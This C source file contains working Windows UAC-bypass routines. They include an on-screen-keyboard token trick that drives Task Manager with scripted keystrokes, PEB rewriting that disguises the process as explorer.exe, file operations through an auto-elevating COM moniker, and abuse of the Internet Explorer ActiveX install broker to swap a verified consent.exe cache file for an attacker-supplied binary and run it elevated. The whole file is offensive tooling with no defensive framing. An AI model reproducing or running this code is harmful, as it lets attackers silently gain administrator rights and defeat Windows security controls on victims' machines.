#include "pch.h"

typedef interface IIEAdminBrokerObject IIEAdminBrokerObject;
typedef interface IActiveXInstallBroker IActiveXInstallBroker;

typedef struct IIEAdminBrokerObjectVtbl {
	BEGIN_INTERFACE

	HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in IIEAdminBrokerObject* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in IIEAdminBrokerObject* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in IIEAdminBrokerObject* This);

	HRESULT(STDMETHODCALLTYPE* InitializeAdminInstaller)(
		__RPC__in IIEAdminBrokerObject* This,
		_In_opt_ LPCOLESTR ProviderName,
		_In_ DWORD Unknown0,
		_COM_Outptr_ void** InstanceGuid);

	END_INTERFACE
} *PIIEAdminBrokerObjectVtbl;

typedef struct IActiveXInstallBrokerVtbl {
	BEGIN_INTERFACE

	HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in IActiveXInstallBroker* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in IActiveXInstallBroker* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in IActiveXInstallBroker* This);

	HRESULT(STDMETHODCALLTYPE* VerifyFile)(
		__RPC__in IActiveXInstallBroker* This,
		_In_ BSTR InstanceGuid,
		_In_ HWND ParentWindow,
		_In_ BSTR Unknown0,
		_In_ BSTR pcwszFilePath,
		_In_ BSTR Unknown1,
		_In_ ULONG dwUIChoice,
		_In_ ULONG dwUIContext,
		_In_ REFGUID GuidKey,
		_Out_ BSTR* VerifiedFileName,
		_Out_ PULONG CertDetailsSize,
		_Out_ void** CertDetails);

	HRESULT(STDMETHODCALLTYPE* RunSetupCommand)(
		__RPC__in IActiveXInstallBroker* This,
		_In_ BSTR InstanceGuid,
		_In_ HWND ParentWindow,
		_In_ BSTR szCmdName,
		_In_ BSTR szInfSection,
		_In_ BSTR szDir,
		_In_ BSTR szTitle,
		_In_ ULONG dwFlags,
		_Out_ PHANDLE lpTargetHandle);

	END_INTERFACE
} *PIActiveXInstallBrokerVtbl;

interface IIEAdminBrokerObject { CONST_VTBL struct IIEAdminBrokerObjectVtbl* lpVtbl; };
interface IActiveXInstallBroker { CONST_VTBL struct IActiveXInstallBrokerVtbl* lpVtbl; };

BOOL BypassByOsk
(
	_In_ LPSTR lpCommandLine
)
{	
	HANDLE hProc = NULL;
	HANDLE hToken = NULL;
	DWORD dwPid = 0;
	SECURITY_ATTRIBUTES sa;
	HANDLE hDuplicatedToken = NULL;
	TOKEN_MANDATORY_LABEL TokenInfo;
	PSID pSid = NULL;
	LPWSTR lpTempPath = NULL;
	CHAR szVbsContent[] = "Set troll = WScript.CreateObject(\"WScript.Shell\")\ntroll.Run \"taskmgr.exe\"\nWScript.Sleep 500\ntroll.SendKeys \"%\"\nWScript.Sleep 500\ntroll.SendKeys \"{F}\"\nWScript.Sleep 50\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 500\ntroll.SendKeys \"^v\"\ntroll.SendKeys \"{TAB}\"\nWScript.Sleep 500\ntroll.SendKeys \"{+}\"\nWScript.Sleep 500\ntroll.SendKeys \"{ENTER}\"\nWScript.Sleep 500\ntroll.AppActivate(\"Task Manager\")\ntroll.SendKeys \"%{f4}\"";
	LPWSTR lpCscriptCommandLine = NULL;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	HGLOBAL hMem = NULL;
	LPWSTR lpGlobalMem = NULL;
	LPWSTR lpTemp = NULL;
	BOOL Result = FALSE;

	SHELLEXECUTEINFOW sei = { sizeof(sei) };
	sei.lpVerb = L"open";
	sei.lpFile = L"osk.exe";
	sei.nShow = SW_SHOW;
	sei.fMask |= SEE_MASK_NOCLOSEPROCESS;
	sei.nShow = SW_HIDE;

	if (!ShellExecuteExW(&sei)) {
		LOG_ERROR("ShellExecuteExW", GetLastError());
		goto CLEANUP;
	}

	dwPid = GetProcessId(sei.hProcess);
	CloseHandle(sei.hProcess);
	hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE, TRUE, dwPid);
	if (hProc == NULL) {
		LOG_ERROR("OpenProcess", GetLastError());
		goto CLEANUP;
	}

	if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
		LOG_ERROR("OpenProcessToken", GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&sa, sizeof(sa));
	if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hDuplicatedToken)) {
		LOG_ERROR("DuplicateTokenEx", GetLastError());
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&TokenInfo, sizeof(TokenInfo));
	ConvertStringSidToSidW(SDDL_ML_MEDIUM, &pSid);
	TokenInfo.Label.Sid = pSid;
	if (!SetTokenInformation(hDuplicatedToken, TokenIntegrityLevel, &TokenInfo, sizeof(TokenInfo))) {
		LOG_ERROR("SetTokenInformation", GetLastError());
		goto CLEANUP;
	}

	LocalFree(pSid);
	if (!WriteToTempPath(szVbsContent, lstrlenA(szVbsContent), L"vbs", &lpTempPath)) {
		goto CLEANUP;
	}

	hMem = GlobalAlloc(GMEM_MOVEABLE, (lstrlenA(lpCommandLine) + 1) * sizeof(WCHAR));
	if (hMem == NULL) {
		LOG_ERROR("GlobalAlloc", GetLastError());
		goto CLEANUP;
	}

	lpGlobalMem = GlobalLock(hMem);
	lpTemp = ConvertCharToWchar(lpCommandLine);
	lstrcpyW(lpGlobalMem, lpTemp);
	lpGlobalMem[lstrlenW(lpGlobalMem)] = L'\0';
	GlobalUnlock(hMem);
	if (!OpenClipboard(NULL)) {
		LOG_ERROR("OpenClipboard", GetLastError());
		goto CLEANUP;
	}

	if (!EmptyClipboard()) {
		LOG_ERROR("EmptyClipboard", GetLastError());
		goto CLEANUP;
	}

	if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
		LOG_ERROR("SetClipboardData", GetLastError());
		goto CLEANUP;
	}

	CloseClipboard();
	lpCscriptCommandLine = ALLOC((lstrlenW(lpTempPath) + 21) * sizeof(WCHAR));
	lstrcpyW(lpCscriptCommandLine, L"cscript.exe /NOLOGO ");
	lstrcatW(lpCscriptCommandLine, lpTempPath);
	RtlSecureZeroMemory(&si, sizeof(si));
	RtlSecureZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessAsUserW(hDuplicatedToken, NULL, lpCscriptCommandLine, &sa, &sa, TRUE, 0, NULL, NULL, &si, &pi)) {
		LOG_ERROR("CreateProcessAsUserW", GetLastError());
		goto CLEANUP;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);
	DeleteFileW(lpTempPath);
	TerminateProcess(hProc, 0);
	hProc = NULL;
	Result = TRUE;
CLEANUP:
	FREE(lpTemp);
	if (hMem != NULL) {
		GlobalFree(hMem);
	}

	if (pi.hThread != NULL) {
		CloseHandle(pi.hThread);
	}

	if (pi.hProcess != NULL) {
		CloseHandle(pi.hProcess);
	}

	if (hToken != NULL) {
		CloseHandle(hToken);
	}

	if (hProc != NULL) {
		CloseHandle(hProc);
	}

	if (hDuplicatedToken != NULL) {
		CloseHandle(hDuplicatedToken);
	}

	FREE(lpCscriptCommandLine);
	FREE(lpTempPath);

	return Result;
}

BOOL MasqueradedDeleteDirectoryFileCOM
(
	_In_ LPWSTR lpFilePath
)
{
	BOOL  Result = FALSE;
	IFileOperation* pFileOperation = NULL;
	IShellItem* pShellItem = NULL;
	HRESULT hResult = E_FAIL;
	HRESULT hResultInit = E_FAIL;
	BIND_OPTS3 BindOpts;
	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}";

	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
	BindOpts.cbStruct = sizeof(BindOpts);
	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
	if (FAILED(hResult)) {
		LOG_ERROR("CoGetObject", hResult);
		goto CLEANUP;
	}

	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
	if (FAILED(hResult)) {
		LOG_ERROR("pFileOperation->SetOperationFlags", hResult);
		goto CLEANUP;
	}

	hResult = SHCreateItemFromParsingName(lpFilePath, NULL, &IID_IShellItem, &pShellItem);
	if (FAILED(hResult)) {
		LOG_ERROR("SHCreateItemFromParsingName", hResult);
		goto CLEANUP;
	}

	hResult = pFileOperation->lpVtbl->DeleteItem(pFileOperation, pShellItem, NULL);
	if (FAILED(hResult)) {
		LOG_ERROR("pFileOperation->DeleteItem", hResult);
		goto CLEANUP;
	}

	hResult = pFileOperation->lpVtbl->PerformOperations(pFileOperation);
	if (FAILED(hResult)) {
		LOG_ERROR("pFileOperation->PerformOperations", hResult);
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	if (pFileOperation != NULL) {
		pFileOperation->lpVtbl->Release(pFileOperation);
	}

	if (pShellItem != NULL) {
		pShellItem->lpVtbl->Release(pShellItem);
	}

	if (hResultInit == S_OK) {
		CoUninitialize();
	}

	return Result;
}

BOOL MasqueradedMoveCopyDirectoryFileCOM
(
	_In_ LPWSTR lpSrcFileName,
	_In_ LPWSTR lpDestPath,
	_In_ BOOL IsMove
)
{
	BOOL  Result = FALSE;
	IFileOperation* pFileOperation = NULL;
	IShellItem* pSrcItem = NULL;
	IShellItem* pDestItem = NULL;
	HRESULT hResult = E_FAIL;
	HRESULT hResultInit = E_FAIL;
	BIND_OPTS3 BindOpts;
	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}";

	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
	BindOpts.cbStruct = sizeof(BindOpts);
	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IFileOperation, &pFileOperation);
	//hResult = CoCreateInstance(&CLSID_FileOperation, NULL, CLSCTX_ALL, &IID_IFileOperation , &pFileOperation);
	if (FAILED(hResult)) {
		LOG_ERROR("CoGetObject", hResult);
		goto CLEANUP;
	}

	hResult = pFileOperation->lpVtbl->SetOperationFlags(pFileOperation, FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);
	if (FAILED(hResult)) {
		LOG_ERROR("pFileOperation->SetOperationFlags", hResult);
		goto CLEANUP;
	}

	hResult = SHCreateItemFromParsingName(lpSrcFileName, NULL, &IID_IShellItem, &pSrcItem);
	if (FAILED(hResult)) {
		LOG_ERROR("SHCreateItemFromParsingName", hResult);
		goto CLEANUP;
	}

	hResult = SHCreateItemFromParsingName(lpDestPath, NULL, &IID_IShellItem, &pDestItem);
	if (FAILED(hResult)) {
		LOG_ERROR("SHCreateItemFromParsingName", hResult);
		goto CLEANUP;
	}

	if (IsMove) {
		hResult = pFileOperation->lpVtbl->MoveItem(pFileOperation, pSrcItem, pDestItem, NULL, NULL);
		if (FAILED(hResult)) {
			LOG_ERROR("pFileOperation->MoveItem", hResult);
			goto CLEANUP;
		}
	}
	else {
		hResult = pFileOperation->lpVtbl->CopyItem(pFileOperation, pSrcItem, pDestItem, NULL, NULL);
		if (FAILED(hResult)) {
			LOG_ERROR("pFileOperation->CopyItem", hResult);
			goto CLEANUP;
		}
	}

	hResult = pFileOperation->lpVtbl->PerformOperations(pFileOperation);
	if (FAILED(hResult)) {
		LOG_ERROR("pFileOperation->PerformOperations", hResult);
		goto CLEANUP;
	}

	Result = TRUE;
CLEANUP:
	if (pFileOperation != NULL) {
		pFileOperation->lpVtbl->Release(pFileOperation);
	}

	if (pSrcItem != NULL) {
		pSrcItem->lpVtbl->Release(pSrcItem);
	}

	if (pDestItem != NULL) {
		pDestItem->lpVtbl->Release(pDestItem);
	}

	if (hResultInit == S_OK) {
		CoUninitialize();
	}

	return Result;
}

VOID NTAPI LdrEnumModulesCallback
(
	_In_ PLDR_DATA_TABLE_ENTRY DataTableEntry,
	_In_ PVOID Context,
	_Inout_ BOOLEAN* StopEnumeration
)
{
	PPEB pPeb = NtCurrentPeb();
	LPWSTR lpFullDllName, lpBaseDllName;
	LPWSTR* pOldDllName = &(*(LPWSTR**)Context)[2];

	if (DataTableEntry->DllBase == pPeb->ImageBaseAddress) {
		if (pOldDllName[0] != NULL && pOldDllName[1] != NULL) {
			lpFullDllName = pOldDllName[0];
			lpBaseDllName = pOldDllName[1];
		}
		else {
			pOldDllName[1] = DataTableEntry->BaseDllName.Buffer;
			pOldDllName[0] = DataTableEntry->FullDllName.Buffer;
			lpFullDllName = pOldDllName[2];
			lpBaseDllName = PathFindFileNameW(pOldDllName[2]);
		}

		InitUnicodeString(&DataTableEntry->FullDllName, lpFullDllName);
		InitUnicodeString(&DataTableEntry->BaseDllName, lpBaseDllName);
		*StopEnumeration = TRUE;
	}
	else {
		*StopEnumeration = FALSE;
	}
}

VOID MasqueradeProcessPath
(
	_In_ LPWSTR lpNewPath,
	_In_ BOOL Restore,
	_Inout_opt_ LPWSTR* pOldPath
)
{
	PPEB pPeb = NULL;
	LPVOID lpImagePathName = NULL;
	LPWSTR lpCommandLine = NULL;

	pPeb = NtCurrentPeb();
	if (!Restore) {
		lpImagePathName = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		lstrcpyW(lpImagePathName, lpNewPath);
		lpCommandLine = PathFindFileNameW(lpImagePathName);
		pOldPath[0] = pPeb->ProcessParameters->ImagePathName.Buffer;
		pOldPath[1] = pPeb->ProcessParameters->CommandLine.Buffer;
		pOldPath[4] = lpNewPath;
	}
	else {
		lpImagePathName = pOldPath[0];
		lpCommandLine = pOldPath[1];
	}

	RtlAcquirePebLock();
	if (Restore) {
		VirtualFree(pPeb->ProcessParameters->ImagePathName.Buffer, 0, MEM_RELEASE);
	}

	InitUnicodeString(&pPeb->ProcessParameters->ImagePathName, lpImagePathName);
	InitUnicodeString(&pPeb->ProcessParameters->CommandLine, lpCommandLine);
	RtlReleasePebLock();
	LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &pOldPath);
}

BOOL IeAddOnInstallMethod
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
)
{
	HRESULT hResult = E_FAIL;
	HRESULT hResultInit = E_FAIL;
	BIND_OPTS3 BindOpts;
	WCHAR wszMoniker[] = L"Elevation:Administrator!new:{BDB57FF2-79B9-4205-9447-F5FE85F37312}";
	GUID IID_IEAxiAdminInstaller = { 0x9AEA8A59, 0xE0C9, 0x40F1, { 0x87, 0xDD, 0x75, 0x70, 0x61, 0xD5, 0x61, 0x77 } };
	GUID IID_IEAxiInstaller2 = { 0xBC0EC710, 0xA3ED, 0x4F99, { 0xB1, 0x4F, 0x5F, 0xD5, 0x9F, 0xDA, 0xCE, 0xA3 } };
	IIEAdminBrokerObject* BrokerObject = NULL;
	BSTR CacheItemFilePath = NULL;
	DWORD cbCacheItemFilePath = 0;
	IActiveXInstallBroker* InstallBroker = NULL;
	BSTR AdminInstallerUuid = NULL;
	WCHAR wszConsentPath[MAX_PATH];
	BSTR FileToVerify = NULL;
	PBYTE pDummy = NULL;
	DWORD cbDummy = 0;
	LPWSTR lpDllPath = NULL;
	LPWSTR lpDirPath = NULL;
	BSTR WorkDir = NULL;
	WCHAR wszTempPath[MAX_PATH];
	BSTR EmptyBstr = NULL;
	HANDLE hProc = NULL;
	BOOL Result = FALSE;
	WCHAR wszExplorerPath[MAX_PATH];
	LPWSTR OldPath[5];
	WCHAR wszNullStr[0x10];

	SecureZeroMemory(wszNullStr, sizeof(wszNullStr));
	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
	lstrcatW(wszExplorerPath, L"\\explorer.exe");
	RtlSecureZeroMemory(OldPath, sizeof(OldPath));
	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
	if (FAILED(hResult)) {
		LOG_ERROR("CoInitializeSecurity", hResult);
		goto CLEANUP;
	}

	RtlSecureZeroMemory(&BindOpts, sizeof(BindOpts));
	BindOpts.cbStruct = sizeof(BindOpts);
	BindOpts.dwClassContext = CLSCTX_LOCAL_SERVER;
	hResult = CoGetObject(wszMoniker, &BindOpts, &IID_IEAxiAdminInstaller, &BrokerObject);
	if (FAILED(hResult)) {
		LOG_ERROR("CoGetObject", hResult);
		goto CLEANUP;
	}

	hResult = BrokerObject->lpVtbl->InitializeAdminInstaller(BrokerObject, NULL, 0, &AdminInstallerUuid);
	if (FAILED(hResult)) {
		LOG_ERROR("BrokerObject->InitializeAdminInstaller", hResult);
		goto CLEANUP;
	}

	hResult = BrokerObject->lpVtbl->QueryInterface(BrokerObject, &IID_IEAxiInstaller2, &InstallBroker);
	if (FAILED(hResult)) {
		LOG_ERROR("BrokerObject->QueryInterface", hResult);
		goto CLEANUP;
	}

	GetSystemDirectoryW(wszConsentPath, _countof(wszConsentPath));
	lstrcatW(wszConsentPath, L"\\consent.exe");
	FileToVerify = SysAllocString(wszConsentPath);
	hResult = InstallBroker->lpVtbl->VerifyFile(InstallBroker, AdminInstallerUuid, INVALID_HANDLE_VALUE, FileToVerify, FileToVerify, NULL, WTD_UI_NONE, WTD_UICONTEXT_EXECUTE, &IID_IUnknown, &CacheItemFilePath, &cbDummy, &pDummy);
	if (FAILED(hResult)) {
		LOG_ERROR("InstallBroker->VerifyFile", hResult);
		goto CLEANUP;
	}

	CoTaskMemFree(pDummy);
	if (!MasqueradedDeleteDirectoryFileCOM(CacheItemFilePath)) {
		goto CLEANUP;
	}

	cbCacheItemFilePath = SysStringLen(CacheItemFilePath);
	lpDllPath = ALLOC(cbCacheItemFilePath * sizeof(WCHAR));
	GetTempPathW(_countof(wszTempPath), wszTempPath);
	wszTempPath[lstrlenW(wszTempPath) - 1] = L'\0';
	wsprintfW(lpDllPath, L"%s\\%s", wszTempPath, PathFindFileNameW(CacheItemFilePath));
	if (!WriteToFile(lpDllPath, pBuffer, cbBuffer)) {
		goto CLEANUP;
	}

	lpDirPath = DuplicateStrW(CacheItemFilePath, 0);
	PathRemoveFileSpecW(lpDirPath);
	if (!MasqueradedMoveCopyDirectoryFileCOM(lpDllPath, lpDirPath, FALSE)) {
		goto CLEANUP;
	}

	WorkDir = SysAllocString(wszTempPath);
	EmptyBstr = SysAllocString(wszNullStr);
	hResult = InstallBroker->lpVtbl->RunSetupCommand(InstallBroker, AdminInstallerUuid, NULL, CacheItemFilePath, EmptyBstr, WorkDir, EmptyBstr, 4, &hProc);
	if (FAILED(hResult)) {
		LOG_ERROR("InstallBroker->RunSetupCommand", hResult);
		goto CLEANUP;
	}

	if (hResult == E_INVALIDARG && lpDirPath != NULL) {
		MasqueradedDeleteDirectoryFileCOM(lpDirPath);
	}

	Result = TRUE;
CLEANUP:
	MasqueradeProcessPath(NULL, TRUE, OldPath);
	if (InstallBroker) {
		InstallBroker->lpVtbl->Release(InstallBroker);
	}

	if (BrokerObject) {
		BrokerObject->lpVtbl->Release(BrokerObject);
	}

	FREE(lpDllPath);
	FREE(lpDirPath);
	if (FileToVerify != NULL) {
		SysFreeString(FileToVerify);
	}

	if (WorkDir != NULL) {
		SysFreeString(WorkDir);
	}

	if (EmptyBstr != NULL) {
		SysFreeString(EmptyBstr);
	}

	if (AdminInstallerUuid != NULL) {
		SysFreeString(AdminInstallerUuid);
	}
	
	if (CacheItemFilePath != NULL) {
		SysFreeString(CacheItemFilePath);
	}

	if (hResultInit == S_OK) {
		CoUninitialize();
	}

	return Result;
}

VOID InitUnicodeString
(
	_Out_ PUNICODE_STRING DestinationString,
	_In_opt_z_ LPWSTR SourceString
)
{
	if (SourceString) {
		DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(lstrlenW(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
	}
	else {
		DestinationString->MaximumLength = DestinationString->Length = 0;
	}

	DestinationString->Buffer = (PWCH)SourceString;
}